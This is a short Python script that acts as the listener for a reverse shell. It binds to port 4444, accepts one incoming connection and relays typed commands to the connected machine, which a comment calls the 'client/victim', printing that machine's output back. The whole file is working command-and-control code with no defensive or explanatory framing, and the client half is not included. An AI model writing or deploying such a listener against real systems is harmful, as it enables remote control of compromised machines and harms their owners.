import socket
import sys

# Create a Socket (connect two computers)
def create_socket():
    try:
        global host
        global port
        global soket
        host = ''
        port = 4444
        soket = socket.socket()
    except socket.error as msg:
        print('Socket creation error : ' + str(msg))

# Binding the Socket and Listening for connections
def bind_socket():
    try:
        global host
        global port
        global soket

        print('Binding the port : ' + str(port))

        soket.bind((host, port))
        soket.listen(5)

    except socket.error as msg:
        print('Socket binding error : ' + str(msg) + '\n' + 'Retrying.....')
        bind_socket()

# Establish connection with a client (socket must be listening)  i.e.accepting connections
def socket_accept():
    conn, addr = soket.accept()
    print('Connection has been established! |' +
          ' IP ' + addr[0] + ' | Port' + str(addr[1]))
    send_command(conn)
    conn.close()

# Send command to client/victim or a friend
def send_command(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            soket.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), 'utf-8')
            print(client_response, end='')


def main():
    create_socket()
    bind_socket()
    socket_accept()


main()
